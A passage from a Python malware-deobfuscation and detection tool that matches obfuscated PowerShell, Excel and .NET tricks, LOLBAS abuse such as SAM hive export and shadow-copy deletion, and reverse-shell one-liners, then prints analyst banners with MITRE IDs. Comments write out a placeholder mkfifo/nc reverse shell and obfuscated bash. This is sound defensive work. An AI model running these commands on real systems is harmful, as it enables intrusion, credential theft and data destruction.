    re.IGNORECASE,
)

def _ps_scriptblock_create_matches(text: str) -> bool:
    return bool(_PS_SB_CREATE_DQ_RX.search(text) or _PS_SB_CREATE_SQ_RX.search(text))

def _handle_ps_scriptblock_create(text: str) -> str:
    m = _PS_SB_CREATE_DQ_RX.search(text) or _PS_SB_CREATE_SQ_RX.search(text)
    if not m:
        raise ValueError("no scriptblock-create match")
    body = m.group("body")
    return f"{text}\n\n# --- [Scriptblock]::Create Lifted (Bohannon) ---\n{body}"


# --- P. EXCEL_REGEX_OBFUSC  (Deep Instinct 2025) ------------------------
# VBA / Excel formula uses REGEXEXTRACT/REGEXREPLACE to pull hidden strings
# from a junk-text-blob cell (e.g. A1) at runtime.
_EXCEL_REGEX_FN_RX = re.compile(
    r"\bREGEX(?:EXTRACT|REPLACE|TEST)\s*\(",
    re.IGNORECASE,
)
_EXCEL_GETVAL_RX = re.compile(r"getval[0-9]?\s*[=(]", re.IGNORECASE)
_EXCEL_VBA_HINTS_RX = re.compile(
    r"(WScript\.Shell|Application\.Evaluate|Shell\s*\(|CreateObject)",
    re.IGNORECASE,
)

def _excel_regex_obfusc_matches(text: str) -> bool:
    fn_hits = len(_EXCEL_REGEX_FN_RX.findall(text))
    if fn_hits < 1:
        return False
    # Confirm we're inside an Office/VBA context (avoid Python `re.regex` false
    # positives) by looking for a helper name pattern or a VBA idiom.
    return bool(_EXCEL_GETVAL_RX.search(text) or _EXCEL_VBA_HINTS_RX.search(text))

def _handle_excel_regex_obfusc(text: str) -> str:
    hits = _EXCEL_REGEX_FN_RX.findall(text)
    banner = (
        "# --- Deep Instinct 2025: Excel REGEX-obfuscation detected ---\n"
        f"# {len(hits)} REGEXEXTRACT/REGEXREPLACE/REGEXTEST call(s) reconstruct\n"
        "# malicious strings at runtime from a hidden text-blob (usually cell A1).\n"
        "# Static tools like OLEVBA WILL MISS this. Deep-scan the sheet cells\n"
        "# for the regex pattern arguments and manually resolve.\n"
        "# MITRE: T1027, T1204.002, T1140. Downstream: PowerShell / WScript.Shell.\n"
    )
    return f"{text}\n\n{banner}"


# --- Q. DOTNET_HOMOGLYPH_REPLACE  (dr4k0nia 2022) -----------------------
# .NET binary/source has string literals with Cyrillic а/е/і/о/с inserted
# and calls String.Replace("<glyph>","") at runtime to strip them.
_HOMOGLYPHS = {
    "\u0430": "a",  # Cyrillic а → Latin a
    "\u0435": "e",  # Cyrillic е → Latin e
    "\u0456": "i",  # Cyrillic і → Latin i
    "\u043e": "o",  # Cyrillic о → Latin o
    "\u0441": "c",  # Cyrillic с → Latin c
}
_HOMOGLYPH_RX = re.compile("[" + "".join(_HOMOGLYPHS.keys()) + "]")
_DOTNET_REPLACE_CALL_RX = re.compile(
    r"\.\s*Replace\s*\(\s*['\"](?P<glyph>[\u0400-\u04FF])['\"]\s*,\s*['\"]{2}\s*\)",
)

def _dotnet_homoglyph_matches(text: str) -> bool:
    return bool(_HOMOGLYPH_RX.search(text) and _DOTNET_REPLACE_CALL_RX.search(text))

def _handle_dotnet_homoglyph(text: str) -> str:
    # Step 1: substitute homoglyphs with their Latin equivalents (canonical)
    normalised = _HOMOGLYPH_RX.sub(lambda m: _HOMOGLYPHS[m.group(0)], text)
    if normalised == text:
        raise ValueError("no homoglyph substitution")
    # Step 2: remove the (now-Latinised) `.Replace("a","")` deobfuscator call
    #         that malware relies on at runtime — it's a source-code artefact
    #         with no operational value after normalisation.
    cleaned = re.sub(
        r"\.\s*Replace\s*\(\s*['\"][a-z]['\"]\s*,\s*['\"]{2}\s*\)",
        "",
        normalised,
    )
    banner = (
        "\n# --- dr4k0nia MurkyStrings homoglyph deobfuscation ---\n"
        "# Cyrillic U+0430/0435/0456/043E/0441 -> Latin a/e/i/o/c\n"
    )
    return f"{cleaned}{banner}"


# --- R. DOTNET_STRING_REMOVE  (dr4k0nia 2022) ---------------------------
# .Remove(<startIndex>,<length>) chained with padded-noise string literals.
# We can't perfectly reverse without the exact indices; produce an analyst
# annotation flagging the technique and citing dr4k0nia.
_DOTNET_REMOVE_CHAIN_RX = re.compile(
    r"(?:\.\s*Remove\s*\(\s*\d+\s*,\s*\d+\s*\)\s*){2,}",
)

def _dotnet_string_remove_matches(text: str) -> bool:
    return bool(_DOTNET_REMOVE_CHAIN_RX.search(text))

def _handle_dotnet_string_remove(text: str) -> str:
    hits = _DOTNET_REMOVE_CHAIN_RX.findall(text)
    if not hits:
        raise ValueError("no .Remove chain")
    banner = (
        "# --- dr4k0nia MurkyStrings .Remove(start,len) chain detected ---\n"
        f"# {len(hits)} chained .Remove(int,int) calls strip inserted noise\n"
        "# (usually System-namespace method names) from padded string literals.\n"
        "# Full recovery requires exact indices from the binary — treat as\n"
        "# .NET T1027 obfuscation and hunt the caller class for the real IOCs.\n"
    )
    return f"{text}\n\n{banner}"


# --- S. PS_CLIPBOARD_IEX  (Bohannon) ------------------------------------
# Two orientations: IEX([Clipboard]::GetText()) OR [Clipboard]::GetText() | IEX
_PS_CLIPBOARD_IEX_A_RX = re.compile(
    r"\[(?:System\.)?Windows\.Forms\.Clipboard\]::GetText\s*\(\s*\)"
    r"[\s\S]{0,80}?(?:IEX|Invoke-Expression|\|\s*iex\b)",
    re.IGNORECASE,
)
_PS_CLIPBOARD_IEX_B_RX = re.compile(
    r"(?:IEX|Invoke-Expression)\s*\(?[\s\S]{0,80}?"
    r"\[(?:System\.)?Windows\.Forms\.Clipboard\]::GetText\s*\(\s*\)",
    re.IGNORECASE,
)

def _ps_clipboard_iex_matches(text: str) -> bool:
    return bool(
        _PS_CLIPBOARD_IEX_A_RX.search(text)
        or _PS_CLIPBOARD_IEX_B_RX.search(text)
    )

def _handle_ps_clipboard_iex(text: str) -> str:
    banner = (
        "# --- Bohannon Cradle: Clipboard → IEX ---\n"
        "# Attacker stages payload into clipboard (via prior process, GPO, or\n"
        "# user paste) then invokes it with IEX. Command-line surface is CLEAN.\n"
        "# MITRE: T1059.001, T1027, T1140. Hunt: Clipboard History / Sysmon EID 1\n"
    )
    return f"{text}\n\n{banner}"


# ─── Feb 2026 Batch-CSV Row Fixes (rows 9/10/11/15) ─────────────────────

# --- U. PS_BASE64_XOR_BYTE_IEX  (row-0009 fix) --------------------------
_PS_B64_XOR_IEX_RX = re.compile(
    r"\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*['\"](?P<blob>[A-Za-z0-9+/=]{12,})['\"]"
    r"[\s\S]{0,300}?"
    r"-b?xor\s*0x(?P<key>[0-9A-Fa-f]{1,2})"
    r"[\s\S]{0,120}?"
    r"(?:GetString|iex|Invoke-Expression)",
    re.IGNORECASE,
)

def _ps_b64_xor_iex_matches(text: str) -> bool:
    return bool(_PS_B64_XOR_IEX_RX.search(text))

def _handle_ps_b64_xor_iex(text: str) -> str:
    m = _PS_B64_XOR_IEX_RX.search(text)
    if not m:
        raise ValueError("no b64+xor pattern")
    blob = m.group("blob")
    key  = int(m.group("key"), 16)
    try:
        raw = robust_b64decode(blob)
    except Exception as e:
        raise ValueError(f"b64 decode failed: {e}") from e
    xored = bytes(b ^ key for b in raw)
    try:
        decoded = xored.decode("ascii")
    except UnicodeDecodeError:
        decoded = "".join(chr(b) if 0x20 <= b < 0x7F else "?" for b in xored)
    banner = (
        "──── PS_BASE64_XOR_BYTE_IEX (Feb 2026) ────\n"
        f"Base64 blob    : {blob[:80]}{'…' if len(blob)>80 else ''}\n"
        f"XOR key        : 0x{key:02X}\n"
        f"Decoded (ASCII): {decoded}\n"
    )
    return f"{text}\n\n{banner}"


# --- V. PS_SAL_ALIAS_RESOLVER  (row-0015 fix) ---------------------------
_PS_SAL_DEFN_RX = re.compile(
    r"\b(?:sal|Set-Alias|New-Alias|nal)\s+(?P<alias>[A-Za-z_]\w{0,20})\s+"
    r"(?P<cmdlet>[A-Za-z][\w\-]{2,40})",
    re.IGNORECASE,
)

def _ps_sal_alias_matches(text: str) -> bool:
    return bool(_PS_SAL_DEFN_RX.search(text))

def _handle_ps_sal_alias(text: str) -> str:
    defs = list(_PS_SAL_DEFN_RX.finditer(text))
    if not defs:
        raise ValueError("no sal alias defs")
    aliases: Dict[str, str] = {}
    for m in defs:
        aliases[m.group("alias")] = m.group("cmdlet")
    resolved = text
    for alias, cmdlet in aliases.items():
        pattern = re.compile(
            rf"(?<![A-Za-z\-])\b{re.escape(alias)}\b(?![A-Za-z\-\.\(])",
            flags=re.IGNORECASE,
        )
        resolved = pattern.sub(cmdlet, resolved)
    if resolved == text:
        raise ValueError("no alias occurrences rewritten")
    banner = "\n──── PS_SAL_ALIAS_RESOLVER · aliases expanded ────\n"
    for a, c in aliases.items():
        banner += f"  {a}  →  {c}\n"
    return f"{text}\n{banner}\n{resolved}"


# --- W. PS_ENVVAR_METHOD_CHAIN  (row-0011 fix) --------------------------
_PS_ENV_REF_RX = re.compile(r"\$env:(\w+)", re.IGNORECASE)
_CMD_SET_INLINE_RX = re.compile(
    r"\bset\s+(\w+)\s*=\s*([^\r\n&\"']+?)(?=\s*(?:&&|\r|\n|$|\"))",
    re.IGNORECASE,
)

def _ps_envvar_method_chain_matches(text: str) -> bool:
    if len(text) > 3000:
        return False
    env_uses = _PS_ENV_REF_RX.findall(text)
    if len(env_uses) < 2:
        return False
    sets = _CMD_SET_INLINE_RX.findall(text)
    if len(sets) < 2:
        return False
    set_names = {n.lower() for n, _ in sets}
    env_names = {u.lower() for u in env_uses}
    return bool(set_names & env_names)

def _handle_ps_envvar_method_chain(text: str) -> str:
    sets = {n: v.strip() for n, v in _CMD_SET_INLINE_RX.findall(text)}
    if not sets:
        raise ValueError("no cmd set defs")
    def _sub(m):
        key = m.group(1)
        for k, v in sets.items():
            if k.lower() == key.lower():
                return v
        return m.group(0)
    resolved = text
    for _ in range(3):
        new = _PS_ENV_REF_RX.sub(_sub, resolved)
        if new == resolved:
            break
        resolved = new
    if resolved == text:
        raise ValueError("no env-var expansion")
    banner = "\n──── PS_ENVVAR_METHOD_CHAIN · cmd $env: expansions ────\n"
    for k, v in sets.items():
        banner += f"  $env:{k}  →  {v}\n"
    return f"{text}\n{banner}\n{resolved}"



# --- T. NATIVE_CMD_EXPLAINER  (Feb 2026 · plain LOLBAS structured output) ─
# When the input is already plaintext (no obfuscation) but is a well-known
# native / LOLBAS command, provide a Google-AI-style structured breakdown so
# the OUTPUT panel stops just echoing the raw line back at the analyst.
# Format is deterministic — never invents fields, only labels known args.

# (regex, [(field_label, group_index or literal, optional_note), …], short_action)
# Each rule is fully independent and cited by NIVX_ID for auditability.
_NATIVE_CMD_RULES: List[Dict[str, Any]] = [
    # reg.exe export HKLM\HIVE C:\path\out.reg [/y]
    {
        "id": "REG_EXPORT_HIVE",
        "rx": re.compile(
            r"\breg(?:\.exe)?\s+export\s+"
            r"(?P<hive>H[KM][A-Z_\\][^\s]*)\s+"
            r"(?P<target>\"?[A-Za-z]:\\[^\s\"]+|/[^\s]+)"
            r"(?P<flags>(?:\s+/[a-zA-Z])*)",
            re.IGNORECASE,
        ),
        "action": "Export Windows Registry Hive",
        "fields": [
            ("Source Path", "hive"),
            ("Target File", "target"),
        ],
        "flag_map": {
            "/y": "Force/Overwrite Existing (/y)",
            "/reg:32": "32-bit view (/reg:32)",
            "/reg:64": "64-bit view (/reg:64)",
        },
        "mitre": "T1003.002 / T1552.002",
        "risk": "SYSTEM/SAM/SECURITY hive export → offline credential extraction (secretsdump).",
    },
    # reg.exe save HKLM\HIVE C:\path\out.hiv [/y]
    {
        "id": "REG_SAVE_HIVE",
        "rx": re.compile(
            r"\breg(?:\.exe)?\s+save\s+"
            r"(?P<hive>H[KM][A-Z_\\][^\s]*)\s+"
            r"(?P<target>\"?[A-Za-z]:\\[^\s\"]+|/[^\s]+)"
            r"(?P<flags>(?:\s+/[a-zA-Z])*)",
            re.IGNORECASE,
        ),
        "action": "Save Registry Hive to Binary File",
        "fields": [
            ("Source Hive", "hive"),
            ("Target File", "target"),
        ],
        "flag_map": {"/y": "Force/Overwrite Existing (/y)"},
        "mitre": "T1003.002",
        "risk": "Binary hive save (HKLM\\SAM etc.) → offline hash extraction.",
    },
    # certutil -urlcache -split -f URL PATH
    # NOTE: intentionally NOT registering CERTUTIL_URLCACHE and CERTUTIL_DECODE_CLI
    # here — those cases are handled by more specific decoders upstream
    # (CERTUTIL_DECODE_PEM, wrapper decoders, etc.) that actually process the
    # payload. The explainer must not intercept them.
    #
    # bitsadmin /transfer job URL LOCAL
    {
        "id": "BITSADMIN_TRANSFER",
        "rx": re.compile(
            r"\bbitsadmin(?:\.exe)?\s+/transfer\s+(?P<job>\S+)\s+"
            r"(?P<url>https?://\S+)\s+(?P<target>\"?[^\s\"]+)",
            re.IGNORECASE,
        ),
        "action": "BITS-based File Transfer (LOLBAS)",
        "fields": [
            ("Job Name",   "job"),
            ("Source URL", "url"),
            ("Target File","target"),
        ],
        "mitre": "T1197 / T1105",
        "risk": "Windows-signed BITS job survives reboots; auto-retries download.",
    },
    # schtasks /Create /SC ONLOGON /TN NAME /TR "CMD"
    {
        "id": "SCHTASKS_CREATE",
        "rx": re.compile(
            r"\bschtasks(?:\.exe)?\s+/Create\s+.*?"
            r"/SC\s+(?P<sc>\S+)\s+.*?"
            r"/TN\s+(?P<tn>\"[^\"]+\"|\S+)\s+.*?"
            r"/TR\s+(?P<tr>\"[^\"]+\"|\S+)",
            re.IGNORECASE | re.DOTALL,
        ),
        "action": "Scheduled Task Creation (Persistence)",
        "fields": [
            ("Schedule",   "sc"),
            ("Task Name",  "tn"),
            ("Target Cmd", "tr"),
        ],
        "mitre": "T1053.005",
        "risk": "Persistence via scheduled task — attacker payload runs on trigger.",
    },
    # sc.exe create SVC binPath= "..." start= auto
    {
        "id": "SC_CREATE_SERVICE",
        "rx": re.compile(
            r"\bsc(?:\.exe)?\s+create\s+(?P<svc>\S+)\s+.*?"
            r"binPath=\s*\"(?P<bin>[^\"]+)\"",
            re.IGNORECASE | re.DOTALL,
        ),
        "action": "Windows Service Creation (Persistence)",
        "fields": [
            ("Service Name", "svc"),
            ("Binary Path",  "bin"),
        ],
        "mitre": "T1543.003",
        "risk": "Auto-start service = boot-time persistence (usually SYSTEM integrity).",
    },
    # vssadmin delete shadows /all /quiet
    {
        "id": "VSSADMIN_DELETE_SHADOWS",
        "rx": re.compile(
            r"\bvssadmin(?:\.exe)?\s+delete\s+shadows\b(?P<flags>.*)",
            re.IGNORECASE,
        ),
        "action": "Volume Shadow-Copy Deletion (Anti-Recovery)",
        "fields": [
            ("Command", "0"),
        ],
        "flag_map": {"/all": "All Snapshots (/all)", "/quiet": "Silent (/quiet)"},
        "mitre": "T1490",
        "risk": "Textbook ransomware pre-encryption step — kills VSS restore points.",
    },
    # wevtutil cl <log>   (event log clear)
    {
        "id": "WEVTUTIL_CLEAR_LOG",
        "rx": re.compile(
            r"\bwevtutil(?:\.exe)?\s+(?:cl|clear-log)\s+"
            r"(?P<log>\"[^\"]+\"|\S+)",
            re.IGNORECASE,
        ),
        "action": "Event Log Clear (Indicator Removal)",
        "fields": [("Log Name", "log")],
        "mitre": "T1070.001",
        "risk": "Attacker wiping evidence — Security/System log often targeted post-breach.",
    },
    # net user <name> <password> /add
    {
        "id": "NET_USER_ADD",
        "rx": re.compile(
            r"\bnet(?:\.exe)?\s+user\s+(?P<user>\S+)(?:\s+(?P<pw>\S+))?\s+/add",
            re.IGNORECASE,
        ),
        "action": "Local User Account Creation",
        "fields": [
            ("Username", "user"),
            ("Password", "pw"),
        ],
        "mitre": "T1136.001",
        "risk": "Rogue local account (often followed by `net localgroup administrators … /add`).",
    },
    # netsh advfirewall firewall add rule ...
    {
        "id": "NETSH_FW_RULE",
        "rx": re.compile(
            r"\bnetsh(?:\.exe)?\s+advfirewall\s+firewall\s+add\s+rule\s+"
            r"name=\"?(?P<name>[^\"\r\n]+)\"?",
            re.IGNORECASE,
        ),
        "action": "Windows Firewall Rule Injection",
        "fields": [("Rule Name", "name")],
        "mitre": "T1562.004",
        "risk": "Attacker unblocks inbound C2 port or disables outbound egress control.",
    },
]


def _native_cmd_explainer_matches(text: str) -> bool:
    if len(text) > 2000 or not text.strip():
        return False
    for rule in _NATIVE_CMD_RULES:
        if rule["rx"].search(text):
            return True
    return False


def _handle_native_cmd_explainer(text: str) -> str:
    for rule in _NATIVE_CMD_RULES:
        m = rule["rx"].search(text)
        if not m:
            continue
        lines: List[str] = [
            f"Action:        {rule['action']}",
        ]
        for label, key in rule["fields"]:
            if key == "0":
                val = m.group(0).strip()
            else:
                try:
                    val = (m.group(key) or "").strip()
                except (IndexError, KeyError):
                    val = ""
            if val:
                lines.append(f"{label + ':':<15}{val}")
        # Decode flag switches
        flag_map = rule.get("flag_map") or {}
        try:
            flag_span = m.group("flags") or ""
        except (IndexError, KeyError):
            flag_span = ""
        if flag_span:
            tokens = [t for t in flag_span.split() if t.startswith("/") or t.startswith("-")]
            expanded = [flag_map.get(t.lower(), t) for t in tokens]
            if expanded:
                lines.append(f"{'Flags:':<15}" + ", ".join(expanded))
        lines.append("")
        lines.append(f"MITRE ATT&CK:  {rule['mitre']}")
        lines.append(f"Risk:          {rule['risk']}")
        lines.append(f"NIVX Rule ID:  {rule['id']}")
        banner = "\n".join(lines)
        return f"{text}\n\n──── NivXRay Native-Command Breakdown ────\n{banner}"
    raise ValueError("no native-cmd rule matched")


# ─── Feb 2026 · Reverse-Shell Primitives (batch-CSV gaps) ───────────────

# X1. BASH_MKFIFO_REVERSE_SHELL — classic named-pipe reverse shell
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
_BASH_MKFIFO_RS_RX = re.compile(
    r"mkfifo\s+(?P<fifo>/\S+)"
    r"[\s\S]{0,240}?"
    # sh -i can be piped-to OR redirected-in:  cat FIFO|/bin/sh -i     or     /bin/sh -i < FIFO
    r"(?:cat\s+(?P=fifo)\s*\|\s*)?(?:/bin/)?(?:sh|bash|zsh|dash)\s+-i"
    r"[\s\S]{0,240}?"
    # C2 endpoint: nc | ncat | openssl s_client
    r"(?:\|\s*)?(?:nc(?:at|\.\w+)?|openssl\s+s_client)\s+"
    r"(?:-\S+\s+)*"                                    # optional CLI flags
    r"(?:-connect\s+)?"                                # openssl form
    r"(?P<host>[\w.\-]+)[\s:]+(?P<port>\d{2,5})",
    re.IGNORECASE,
)

def _bash_mkfifo_rs_matches(text: str) -> bool:
    return bool(_BASH_MKFIFO_RS_RX.search(text))

def _handle_bash_mkfifo_rs(text: str) -> str:
    m = _BASH_MKFIFO_RS_RX.search(text)
    if not m:
        raise ValueError("no mkfifo-rs match")
    banner = (
        "──── BASH_MKFIFO_REVERSE_SHELL (Feb 2026) ────\n"
        f"Named pipe   : {m.group('fifo')}\n"
        f"Callback host: {m.group('host')}\n"
        f"Callback port: {m.group('port')}\n"
        "Behavior     : Interactive reverse shell via named-pipe I/O relay.\n"
        "MITRE ATT&CK : T1059.004 (Unix Shell), T1071.001 (Application Layer),\n"
        "               T1095 (Non-Application Layer), T1571 (Non-Standard Port)\n"
    )
    return f"{text}\n\n{banner}"


# X2. PYTHON_SOCKET_REVERSE_SHELL — python -c '... socket.socket ... dup2 ... subprocess ...'
_PY_SOCK_RS_RX = re.compile(
    r"python\d?\s+-c\s+['\"]?[\s\S]{0,600}?"
    r"socket\.socket\s*\(\s*(?:socket\.)?AF_INET"
    r"[\s\S]{0,240}?"
    r"\.connect\s*\(\s*\(?\s*['\"](?P<host>[\d.]+|[\w\-.]+)['\"]\s*,\s*(?P<port>\d{2,5})\s*\)?"
    r"[\s\S]{0,240}?"
    r"(?:dup2|pty\.spawn|subprocess)",
    re.IGNORECASE,
)

def _py_sock_rs_matches(text: str) -> bool:
    return bool(_PY_SOCK_RS_RX.search(text))

def _handle_py_sock_rs(text: str) -> str:
    m = _PY_SOCK_RS_RX.search(text)
    if not m:
        raise ValueError("no python-rs match")
    banner = (
        "──── PYTHON_SOCKET_REVERSE_SHELL (Feb 2026) ────\n"
        f"Callback host: {m.group('host')}\n"
        f"Callback port: {m.group('port')}\n"
        "Behavior     : socket.socket + dup2/pty + subprocess = interactive reverse shell.\n"
        "MITRE ATT&CK : T1059.006 (Python), T1071.001, T1095, T1571\n"
    )
    return f"{text}\n\n{banner}"


# X3. PERL_SOCKET_REVERSE_SHELL — perl -MIO::Socket -e '$c=new IO::Socket::INET(PeerAddr,"H:P")...'
_PERL_RS_RX = re.compile(
    r"perl\s+(?:\S+\s+)*-e\s*['\"]?[\s\S]{0,400}?"
    r"IO::Socket::INET\s*\("
    r"[\s\S]{0,200}?"
    r"PeerAddr\s*(?:,|=>)?\s*['\"]?(?P<host>[\w.\-]+):(?P<port>\d{2,5})",
    re.IGNORECASE,
)

def _perl_rs_matches(text: str) -> bool:
    return bool(_PERL_RS_RX.search(text))

def _handle_perl_rs(text: str) -> str:
    m = _PERL_RS_RX.search(text)
    if not m:
        raise ValueError("no perl-rs match")
    banner = (
        "──── PERL_SOCKET_REVERSE_SHELL (Feb 2026) ────\n"
        f"Callback host: {m.group('host')}\n"
        f"Callback port: {m.group('port')}\n"
        "Behavior     : IO::Socket::INET one-liner reverse shell (classic Metasploit payload).\n"
        "MITRE ATT&CK : T1059.006 (Perl-family), T1071.001, T1095, T1571\n"
    )
    return f"{text}\n\n{banner}"


# X4. BASH_GLOB_OBFUSCATION — /???/b??h -c "w"'\"u"'w"'\"m"'i" → /bin/bash -c whoami
_BASH_GLOB_RX = re.compile(
    r"/\?{3,}/[a-z\?]{2,10}\s+-c\s+['\"]",
    re.IGNORECASE,
)

def _bash_glob_matches(text: str) -> bool:
    return bool(_BASH_GLOB_RX.search(text))

def _handle_bash_glob(text: str) -> str:
    m = _BASH_GLOB_RX.search(text)
    if not m:
        raise ValueError("no glob-obfusc match")
    # Strip quote-inserted noise: 'x'"y"'z' → xyz
    clean = re.sub(r"['\"]", "", text)
    # Then resolve /???/b??h → /bin/bash
    clean = re.sub(r"/\?{3,}/b\?{2,}h", "/bin/bash", clean)
    clean = re.sub(r"/\?{3,}/s\?{1,}", "/bin/sh", clean)
    banner = (
        "──── BASH_GLOB_OBFUSCATION (Feb 2026) ────\n"
        "Shell path was obfuscated via character-class globbing (?/*) so\n"
        "AWL / string-match tools cannot flag 'bash' or 'sh' by name.\n"
        "MITRE ATT&CK : T1027.010 (Command Obfuscation), T1059.004 (Unix Shell)\n\n"
        f"Deobfuscated : {clean}\n"
    )
    return f"{text}\n\n{banner}"


# X5. BASH_WGET_FLOCK_BACKGROUND — wget URL | flock ... | bash &
_BASH_WGET_FLOCK_RX = re.compile(
    r"(?:wget|curl)\s+(?:\S+\s+)*(?P<url>https?://\S+)"
    r"[\s\S]{0,160}?"
    r"(?:flock\s+\S+\s+\S+\s+)?"
    r"(?:sh|bash|zsh|dash)(?:\s*(?:$|&|\||;)|\s*-c)",
    re.IGNORECASE,
)

def _bash_wget_flock_matches(text: str) -> bool:
    return bool(_BASH_WGET_FLOCK_RX.search(text))

def _handle_bash_wget_flock(text: str) -> str:
    m = _BASH_WGET_FLOCK_RX.search(text)
    if not m:
        raise ValueError("no wget-flock match")
    banner = (
        "──── BASH_WGET_FLOCK_BACKGROUND (Feb 2026) ────\n"
        f"Download URL : {m.group('url')}\n"
        "Behavior     : wget → shell pipe, backgrounded, often flock-guarded\n"
        "               to prevent parallel-run collisions (botnet hallmark).\n"
        "MITRE ATT&CK : T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell),\n"
        "               T1027 (Obfuscated Files)\n"
    )
    return f"{text}\n\n{banner}"


# X6. BASH_DEV_TCP_EXFIL — /dev/tcp/<host>/<port> redirection (row-07)
_BASH_DEV_TCP_RX = re.compile(
    r"(?:>\s*|<\s*|>&\s*|<&\s*|exec\s+\d*<>\s*)?/dev/(?:tcp|udp)/(?P<host>[\d.]+|[\w\-.]+)/(?P<port>\d{2,5})",
    re.IGNORECASE,
)

def _bash_dev_tcp_matches(text: str) -> bool:
    return bool(_BASH_DEV_TCP_RX.search(text))

def _handle_bash_dev_tcp(text: str) -> str:
    m = _BASH_DEV_TCP_RX.search(text)
    if not m:
        raise ValueError("no /dev/tcp match")
    banner = (
        "──── BASH_DEV_TCP_EXFIL (Feb 2026) ────\n"
        f"Callback host: {m.group('host')}\n"
        f"Callback port: {m.group('port')}\n"
        "Behavior     : bash's /dev/tcp pseudo-device — file-descriptor-driven\n"
        "               network I/O. Used for reverse shells AND raw exfil.\n"
        "MITRE ATT&CK : T1059.004 (Unix Shell), T1041 (Exfil over C2), T1571\n"
    )
    return f"{text}\n\n{banner}"


# X7. Bash_base32_pipe_shell — echo "..." | base32 -d | sh (row-10 variant)
_BASH_B32_PIPE_RX = re.compile(
    r"echo\s+['\"]?(?P<blob>[A-Z2-7=]{8,})['\"]?"
    r"\s*\|\s*base32\s+-d\s*\|\s*(?:sh|bash|dash|zsh)",
    re.IGNORECASE,
)

def _bash_b32_pipe_matches(text: str) -> bool:
    return bool(_BASH_B32_PIPE_RX.search(text))

def _handle_bash_b32_pipe(text: str) -> str:
    import base64 as _b64
    m = _BASH_B32_PIPE_RX.search(text)
    if not m:
        raise ValueError("no base32-pipe-shell")
    blob = m.group("blob").upper()
    # base32 needs padding to multiple of 8
    if len(blob) % 8 != 0:
        blob = blob + "=" * (8 - len(blob) % 8)
    try:
        decoded = _b64.b32decode(blob, casefold=True).decode("utf-8", errors="replace")
    except Exception as e:
        decoded = f"[base32 decode failed: {e}]"
    banner = (
        "──── Bash_base32_pipe_shell (Feb 2026) ────\n"
        f"Base32 blob : {blob}\n"
        f"Decoded     : {decoded}\n"
        "Behavior    : Bash pipe: base32-decode then exec via sh (less common\n"
        "              than base64 → common EDR-evasion trick).\n"
        "MITRE       : T1027 / T1140 / T1059.004\n"
    )
    return f"{text}\n\n{banner}"


ARCHETYPES: List[Dict[str, Any]] = [
    # ─── Feb 2026 · Reverse-Shell Primitives (batch-CSV row 3/4/5/6/8/9 fix) ─
    {
        "id": "BASH_MKFIFO_REVERSE_SHELL",
        "description": "Named-pipe reverse shell (mkfifo + cat + sh -i + nc).",
        "chain": ["reverse-shell-mkfifo"],
        "handler": _handle_bash_mkfifo_rs,
        "match":   lambda t: _bash_mkfifo_rs_matches(t),
        "terminal": True,
    },
    {
        "id": "PYTHON_SOCKET_REVERSE_SHELL",
        "description": "Python one-liner reverse shell (socket + dup2 + subprocess).",
        "chain": ["reverse-shell-python"],
        "handler": _handle_py_sock_rs,
        "match":   lambda t: _py_sock_rs_matches(t),
        "terminal": True,
    },
    {
        "id": "PERL_SOCKET_REVERSE_SHELL",
        "description": "Perl one-liner reverse shell (IO::Socket::INET).",
        "chain": ["reverse-shell-perl"],
        "handler": _handle_perl_rs,
        "match":   lambda t: _perl_rs_matches(t),
        "terminal": True,
    },
    {
        "id": "BASH_GLOB_OBFUSCATION",
        "description": "Bash `/???/b??h -c` character-class glob shell-path obfuscation.",
        "chain": ["glob-resolve"],
        "handler": _handle_bash_glob,
        "match":   lambda t: _bash_glob_matches(t),
        "terminal": True,
    },
    {
        "id": "BASH_WGET_FLOCK_BACKGROUND",
        "description": "`wget URL | (flock) | bash &` backgrounded downloader (botnet hallmark).",
        "chain": ["download-shell-bg"],
        "handler": _handle_bash_wget_flock,
        "match":   lambda t: _bash_wget_flock_matches(t),
        "terminal": True,
    },
    {
        "id": "BASH_DEV_TCP_EXFIL",
        "description": "bash /dev/tcp/host/port pseudo-device (reverse shell / raw exfil).",
        "chain": ["dev-tcp-annotate"],
        "handler": _handle_bash_dev_tcp,
        "match":   lambda t: _bash_dev_tcp_matches(t),
        "terminal": True,
    },
    {
        "id": "Bash_base32_pipe_shell",
        "description": "echo '<base32>' | base32 -d | sh (row-10 variant).",
        "chain": ["extract-b32", "base32-decode"],
        "handler": _handle_bash_b32_pipe,
        "match":   lambda t: _bash_b32_pipe_matches(t),
        "terminal": True,
    },
    {
        "id": "BASH_HEX_ECHO_XXD",
        "description": "Bash echo <hex> | xxd -r -p — hex-encoded IOC / reverse-shell target",
        "chain": ["extract-hex", "hex-decode"],
        "handler": _handle_bash_hex_xxd,
        "match":   lambda t: bool(_BASH_HEX_XXD_RX.search(t)),
    },
    {
        "id": "CERTUTIL_DECODE_PEM",
        "description": "certutil -decode + PEM-wrapped base64 (PE staging / T1140+T1218)",
        "chain": ["extract-pem", "base64-decode", "pe-header-check"],
        "handler": _handle_certutil_decode,
        "match":   lambda t: (
            bool(_PEM_BLOB_RX.search(t) or _CERTUTIL_STAGING_RX.search(t))
            and "CERTUTIL / PEM PAYLOAD — DETERMINISTIC DECODE" not in t
        ),
        # Output is a forensic REPORT (hexdump + summary), NOT a further-
        # decodable payload. The recursive wrapper must not re-enter it,
        # otherwise smart/magic would strip the report and re-extract the
        # base64 blob, clobbering the analyst-facing view.
        "terminal": True,
    },
    {
        "id": "BASH_PARAM_EXP_SLICE",
        "description": "Bash ${VAR:x:y} substring param-expansion — char-by-char command build",
        "chain": ["resolve-param-expansion"],
        "handler": _handle_bash_param_exp,
        "match":   lambda t: bool(_BASH_PARAM_EXP_RX.search(t)),
    },
    {
        "id": "CMD_FORLOOP_REVERSE_STRING",
        "description": "CMD `for /L … !p:~%i,1!` reverse-string obfuscation (Emotet/QakBot)",
        "chain": ["extract-p-var", "reverse-string"],
        "handler": _handle_cmd_forloop_reverse,
        "match":   lambda t: bool(_CMD_FORLOOP_REV_RX.search(t)),
    },
    {
        "id": "CMD_CARET_OBFUSC",
        "description": "CMD caret-escape obfuscation (c^m^d^ /c wh^oami) — Emotet family",
        "chain": ["strip-carets"],
        "handler": _handle_cmd_caret_obfusc,
        "match":   lambda t: bool(_CMD_CARET_OBFUSC_RX.search(t)),
    },
    {
        "id": "JS_BUFFER_GUNZIP",
